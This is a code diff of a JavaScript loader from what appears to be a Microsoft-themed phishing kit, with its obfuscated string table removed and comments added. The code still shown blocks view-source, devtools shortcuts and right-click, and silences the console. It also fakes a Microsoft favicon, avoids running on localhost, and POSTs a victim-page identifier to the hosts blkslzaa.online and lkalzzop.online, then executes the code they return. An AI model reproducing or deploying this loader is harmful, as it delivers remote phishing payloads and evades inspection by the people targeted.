@@ -1,147 +1,10 @@
 <script>
-  var wordList = [
-    "RmlzLjAwNC5oQ3JlYW0=",
-    "onload",
-    "script",
-    "createElement",
-    "src",
-    "https://code.jquery.com/jquery-1.9.1.js",
-    "appendChild",
-    "head",
-    "getElementsByTagName",
-    "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js",
-    "link",
-    "rel",
-    "shortcut icon",
-    "href",
-    "https://lh3.googleusercontent.com/pw/AMWts8CjWLE-4lSHnzZVyyi38RiG_iHUev92wvk3GXVlZur4_v68tJc5TxPcsfc6Vo4P2_Sa5_Dg4wBjO9x0q0xYFQKyjpg1zURhvOLxyPhDhPJg_Z8XDFduSWtavIhhZp_z9dX4zrOp2jk9GCWUmL_6qus=s128-no",
-    "div",
-    "id",
-    "htmlid",
-    "body",
-    "p",
-    "LoadingPLSWTF",
-    "innerHTML",
-    "Loading .. please wait ..",
-    "Ctrl+U",
-    "add",
-    "keydown",
-    "target",
-    "string",
-    "getElementById",
-    "toLowerCase",
-    "event",
-    "disable_in_input",
-    "srcElement",
-    "nodeType",
-    "parentNode",
-    "INPUT",
-    "tagName",
-    "TEXTAREA",
-    "keyCode",
-    "which",
-    "fromCharCode",
-    ",",
-    ".",
-    "+",
-    "split",
-    "~",
-    "!",
-    "@",
-    "#",
-    "$",
-    "%",
-    "^",
-    "&",
-    "*",
-    "(",
-    ")",
-    "_",
-    ":",
-    '"',
-    "<",
-    ">",
-    "?",
-    "|",
-    "ctrlKey",
-    "shiftKey",
-    "altKey",
-    "metaKey",
-    "length",
-    "ctrl",
-    "control",
-    "shift",
-    "alt",
-    "meta",
-    "keycode",
-    "propagate",
-    "cancelBubble",
-    "returnValue",
-    "stopPropagation",
-    "preventDefault",
-    "all_shortcuts",
-    "type",
-    "addEventListener",
-    "attachEvent",
-    "on",
-    "callback",
-    "detachEvent",
-    "removeEventListener",
-    "Meta+Alt+U",
-    "Ctrl+Shift+I",
-    "Ctrl+Shift+J",
-    "Ctrl+Shift+C",
-    "Meta+C",
-    "contextmenu",
-    "onkeydown",
-    "location",
-    "https://microsoft.com",
-    "Hmmm ..",
-    "toString@",
-    "includes",
-    "stack",
-    "defineProperties",
-    "log",
-    "hostname",
-    "localhost",
-    "127.0.0.1",
-    "Don't run me here!",
-    "aHR0cDovL2Jsa3NsemFhLm9ubGluZQ",
-    "aHR0cHM6Ly9sa2FsenpvcC5vbmxpbmU=",
-    "post",
-    "/obufsssssssscaaatoion/",
-    "Normal",
-    "json",
-    "output",
-    "Allow_Online",
-    "Yes",
-    "http://",
-    "indexOf",
-    "https://",
-    "hide",
-    "No",
-    "Both",
-    "ajax",
-    "gud",
-    "nr gud",
-  ];
-
+  // This function creates a shortcut key combination and assigns a callback function to it.
+  // It also adds an event listener to the options object.
   window.onload = function () {
-    /**
-     * Shortcut Handler
-     * This code defines a shortcut handler utility that allows adding keyboard shortcuts.
-     * It provides functionality to bind a specific key combination to a callback function.
-     */
     var shortcutHandler = {
       all_shortcuts: {},
-      /**
-       * Add a keyboard shortcut
-       * @param {string} shortcut_combination - The key combination for the shortcut
-       * @param {function} callback - The callback function to be executed when the shortcut is triggered
-       * @param {object} opt - Optional configuration for the shortcut
-       */
       add: function (shortcut_combination, callback, opt) {
-        // Default configuration options
         var defaults = {
           type: "keydown",
           propagate: false,
@@ -152,7 +15,6 @@
 
         var options = defaults;
 
-        // Apply options if provided
         if (opt) {
           for (var key in options) {
             if (opt[key] === void 0) {
@@ -163,20 +25,15 @@
           opt = options;
         }
 
-        // Resolve the target element
         var target = opt.target;
         if (opt.target == typeof "string") {
           target = document.getElementById(opt.target);
         }
 
-        // Convert shortcut combination to lowercase
         shortcut_combination = shortcut_combination.toLowerCase();
 
-        // Key event handler
         key = function (event) {
           event = event || window.event;
-
-          // Disable shortcut in input fields if specified
           if (opt.disable_in_input) {
             var target;
             if (event.target) {
@@ -201,7 +58,6 @@
 
           var character = String.fromCharCode(code).toLowerCase();
 
-          // Special handling for specific character codes
           if (code == 188) {
             character = ",";
           }
@@ -212,7 +68,6 @@
           var params = shortcut_combination.split("+");
           var num_modifiers = 0;
 
-          // Mapping for special keys and their codes
           var special_keys = {
             16: "shift",
             17: "ctrl",
@@ -226,7 +81,6 @@
           var altKey = false;
           var metaKey = false;
 
-          // Check each parameter in the shortcut combination
           for (var i = 0; i < params.length; i++) {
             var key = params[i];
             if (key == "ctrl" || key == "control") {
@@ -243,7 +97,6 @@
               metaKey = true;
             } else if (key.length > 1) {
             } else if (key.length > 1) {
-              // Check for special keys
               if (special_keys[code] == key) {
                 num_modifiers++;
               }
@@ -262,8 +115,6 @@
             }
           }
 
-          // Check if the number of modifiers matches the number of parameters in the shortcut combination
-          // and if the modifier keys (ctrl, shift, alt, meta) match the event's modifier keys
           if (
             num_modifiers == params.length &&
             ctrlKey == event.ctrlKey &&
@@ -271,28 +122,19 @@
             altKey == event.altKey &&
             metaKey == (event.metaKey || event.ctrlKey)
           ) {
-            // Call the callback function with the event as its argument
             callback(event);
-            // If propagation is not allowed, prevent the event from bubbling up the DOM tree
             if (!opt.propagate) {
               event.cancelBubble = true;
               event.returnValue = false;
-              // If the event has a stopPropagation method, call it to prevent further propagation
               if (event.stopPropagation) {
                 event.stopPropagation();
                 event.preventDefault();
               }
-              // Return false to indicate that the event has been handled
               return false;
             }
           }
         };
 
-        // This code block adds a new keyboard shortcut to the page by creating a new object in the all_shortcuts array.
-        // The object contains the callback function, the target element, and the event type.
-        // If the target element supports addEventListener, the event listener is added using addEventListener.
-        // Otherwise, if the target element supports attachEvent, the event listener is added using attachEvent.
-        // If neither method is supported, the event listener is added using the on[event] property of the target element.
         this.all_shortcuts[shortcut_combination] = {
           callback: key,
           target: options,
@@ -308,6 +150,7 @@
           }
         }
       },
+      // This function removes a shortcut key combination and its associated callback function.
       remove: function (name) {
         name = name.toLowerCase();
         var args = this.all_shortcuts[name];
@@ -328,7 +171,7 @@
       },
     };
 
-    // Disable the keyboard shortcuts by adding a new shortcut that does nothing when triggered.
+    // These lines add several shortcut key combinations and their associated callback functions.
     shortcutHandler.add("Meta+C", function () {});
     shortcutHandler.add("Ctrl+U", function () {});
     shortcutHandler.add("Meta+Alt+U", function () {});
@@ -336,7 +179,7 @@
     shortcutHandler.add("Ctrl+Shift+J", function () {});
     shortcutHandler.add("Ctrl+Shift+C", function () {});
 
-    // Disable the Context Menu
+    // This event listener prevents the context menu from appearing when the user right-clicks on the webpage.
     document.addEventListener(
       "contextmenu",
       function (mouseEvent) {
@@ -345,19 +188,15 @@
       false,
     );
 
-    // This code block sets an event listener on the document object for the "keydown" event.
-    // When the event is triggered, it checks if the "ctrl" key and the "u" key are pressed simultaneously.
-    // If they are, it returns false, which prevents the default behavior of opening the "view source" window.
+    // This event listener prevents the default behavior of the Ctrl+U key combination.
     document.onkeydown = function (keyboardEvent) {
       if (keyboardEvent.ctrlKey && keyboardEvent.keyCode === 85) {
         return false;
       }
     };
 
-    // This code overrides the behavior of the Error object by defining a custom error class.
-    // The CustomError class extends the Error class and modifies the message property and toString method.
-    // The code modifies the behavior of the error object, causing the browser to navigate to a specific URL
-    // when accessing the message property and displaying alerts under certain conditions when invoking the toString method.
+    // This class extends the Error class and overrides its message and toString methods.
+    // When an instance of this class is created, it redirects the user to the Microsoft website and displays an alert message.
     class CustomError extends Error {
       get message() {
         window.location.href = "https://microsoft.com";
@@ -370,27 +209,30 @@
         }
       }
     }
+
+    // This line creates an instance of the CustomError class and logs it to the console.
     console.log(new CustomError());
 
-    // Disable logging to the console
+    // This line overrides the console.log function with an empty function.
     console.log = function () {};
 
-    var test = document.createElement("script");
-    test.src = "https://code.jquery.com/jquery-1.9.1.js";
-    document.getElementsByTagName("head")[0].appendChild(test);
+    // These lines create script elements and append them to the head of the webpage.
+    var jquery = document.createElement("script");
+    jquery.src = "https://code.jquery.com/jquery-1.9.1.js";
+    document.getElementsByTagName("head")[0].appendChild(jquery);
 
-    // This code block adds a new script element to the page that loads the CryptoJS library.
     var cryptoJsScript = document.createElement("script");
     cryptoJsScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
     document.getElementsByTagName("head")[0].appendChild(cryptoJsScript);
 
-    // Adds an icon that looks like the Microsoft logo to the page's favicon.
+    // This line creates a link element for the favicon and appends it to the head of the webpage.
     var faviconElement = document.createElement("link");
     faviconElement.rel = "shortcut icon";
     faviconElement.href =
       "https://lh3.googleusercontent.com/pw/AMWts8CjWLE-4lSHnzZVyyi38RiG_iHUev92wvk3GXVlZur4_v68tJc5TxPcsfc6Vo4P2_Sa5_Dg4wBjO9x0q0xYFQKyjpg1zURhvOLxyPhDhPJg_Z8XDFduSWtavIhhZp_z9dX4zrOp2jk9GCWUmL_6qus=s128-no";
     document.getElementsByTagName("head")[0].appendChild(faviconElement);
 
+    // These lines create a div element and append it to the body of the webpage.
     var htmlElement = document.createElement("div");
     htmlElement.id = "htmlid";
     document.getElementsByTagName("body")[0].appendChild(htmlElement);
@@ -400,12 +242,13 @@
     loadingElement.innerHTML = "Loading .. please wait ..";
     document.getElementsByTagName("body")[0].appendChild(loadingElement);
 
-    // Checks if we are on localhost and prevents the script from running
+    // This block of code checks the hostname of the webpage and makes an AJAX request to a specified URL.
+    // It also evaluates the response and executes the output if certain conditions are met.
     if (location.hostname === "localhost" || location.hostname === "127.0.0.1") {
       console.log("Don't run me here!");
     } else {
-      blkslzaaURL = atob("aHR0cDovL2Jsa3NsemFhLm9ubGluZQ");   // http://blkslzaa.online
-      lkalzzopURL = atob("aHR0cHM6Ly9sa2FsenpvcC5vbmxpbmU="); // https://lkalzzop.online
+      blkslzaaURL = "http://blkslzaa.online";
+      lkalzzopURL = "https://lkalzzop.online";
       finalURL = blkslzaaURL;
       counter = 1;
 
@@ -415,7 +258,7 @@
           url: finalURL + "/obufsssssssscaaatoion/",
           data: {
             PageType: "Normal",
-            NAMEOFTHEGUY: atob(IGOBZL), // RmlzLjAwNC5oQ3JlYW0 => Fis.004.hCream 
+            NAMEOFTHEGUY: "Fis.004.hCream",
           },
           dataType: "json",
           success: function (response) {
@@ -457,12 +300,14 @@
 
       var isRunning = true;
 
+      // This function returns a promise that resolves after a specified duration.
       const delay = (duration) => {
         return new Promise((resolve) => {
           return setTimeout(resolve, duration);
         });
       };
 
+      // This function repeatedly calls the makeAjaxRequest function until it succeeds.
       const runCode = async () => {
         while (isRunning) {
           try {
